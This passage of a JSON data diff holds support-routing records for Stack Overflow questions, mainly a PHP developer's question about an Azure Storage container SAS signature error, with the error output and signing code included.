+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Azure send Push Notification to Multiple Devices/Broadcast",
+        "up_vote_count": 0,
+        "utdata": 74,
+        "view_count": 0
+    },
+    {
+        "IRT": "N/A",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/1/2017 11:02:13 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I＇m using these methods to get sas container access. How can I update them to access to a container properly? I get the following error: ＂Signature did not match＂. I can get access to a single blob but I can＇t find the fix to allow access to a container.</p>\n\n<p>URL:<a href=＂https://storage.blob.core.windows.net/container?se=2017-03-01T11%3A30%3A25.0000000Z&amp;st=2017-03-01T10%3A07%3A05.0000000Z&amp;sr=c&amp;sp=rwdl&amp;sig=_SIGNATURE_&amp;sv=2015-04-05&amp;spr=https＂ rel=＂nofollow noreferrer＂>https://storage.blob.core.windows.net/container?se=2017-03-01T11%3A30%3A25.0000000Z&amp;st=2017-03-01T10%3A07%3A05.0000000Z&amp;sr=c&amp;sp=rwdl&amp;sig=<em>SIGNATURE</em>&amp;sv=2015-04-05&amp;spr=https</a></p>\n\n<p>Error:</p>\n\n<pre><code>&lt;Error&gt;\n&lt;Code&gt;AuthenticationFailed&lt;/Code&gt;\n&lt;Message&gt;\nServer failed to authenticate the request. Make sure the value of Authorization header is formed correctly including the signature. RequestId:7dd5dba8-0001-0035-5278-926fe6000000 Time:2017-03-01T10:40:41.6498650Z\n&lt;/Message&gt;\n&lt;AuthenticationErrorDetail&gt;\nSignature did not match. String to sign used was rwdl 2017-03-01T10:07:05.0000000Z 2017-03-01T11:30:25.0000000Z /blob/storage/$root https 2015-04-05\n&lt;/AuthenticationErrorDetail&gt;\n&lt;/Error&gt;\n</code></pre>\n\n<p>Code: </p>\n\n<pre><code>public function generateContainerSAS() {\n       if(!$this-&gt;existsContainer()){\n             $this-&gt;blobClient-&gt;createContainer($this-&gt;container);\n       }    \n       $start =  $this-&gt;isoDate(time() - 2000);\n       $expiry = $this-&gt;isoDate(time() + 3000);\n       $signature = $this-&gt;getSASForContainer(AZURE_STORAGE_ACCOUNT_NAME,$this-&gt;container,\n               ＇rwdl＇,$start, $expiry,AZURE_STORAGE_PRIMARY_KEY);\n\n       $sharedAccessUrl = $this-&gt;getContainerUrl(AZURE_STORAGE_ACCOUNT_NAME,$this-&gt;container,\n               ＇c＇,＇rwdl＇,$start, $expiry,$signature);\n\n       return $sharedAccessUrl;\n    }\n\n\nfunction getContainerUrl($accountName,$container,$resourceType,$permissions,$start, $expiry,$_signature){\n        /* Create the signed query part */\n        $_parts = array();\n        $_parts[] = (!empty($expiry))?＇se=＇ . urlencode($expiry):＇＇;\n        $_parts[] = (!empty($start))?＇st=＇ . urlencode($start):＇＇;\n        $_parts[] = ＇sr=＇ . $resourceType;\n        $_parts[] = (!empty($permissions))?＇sp=＇ . $permissions:＇＇;\n        $_parts[] = ＇sig=＇ . urlencode($_signature);\n        $_parts[] = ＇sv=2015-04-05＇;\n        $_parts[] = ＇spr=https＇;\n\n        /* Create the signed blob URL */\n        $_url = ＇https://＇\n        . $accountName.＇.blob.core.windows.net/＇\n        . $container . ＇?＇\n        . implode(＇&amp;＇, $_parts);\n\n        return $_url;\n    }\n\n\n  function getSASForContainer($accountName,$container, $permissions, $start, $expiry,$key){\n\n        $_arraysign = array();\n        $_arraysign[] = $permissions;\n        $_arraysign[] = $start;\n        $_arraysign[] = $expiry;\n        $_arraysign[] = ＂/blob/＂ . $accountName . ＇/＇ . $container;\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇https＇;\n        $_arraysign[] = ＂2015-04-05＂; //the API version is now required\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇＇;\n        $_arraysign[] = ＇＇;\n        $_str2sign = implode(＂\\n＂, $_arraysign);\n\n        return base64_encode(\n        hash_hmac(＇sha256＇, urldecode(utf8_encode($_str2sign)), base64_decode($key), true)\n        );\n    }\n</code></pre>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/1/2017 10:25:19 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42529164/azure-sdk-php-sas-for-container",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42529164,
+        "score": 0,
+        "status": "Deleted In SO",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;windows-azure-storage;azure-storage-blobs"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Azure SDK PHP SAS for container",
+        "up_vote_count": 0,
+        "utdata": 0,
+        "view_count": 0
+    }
+]
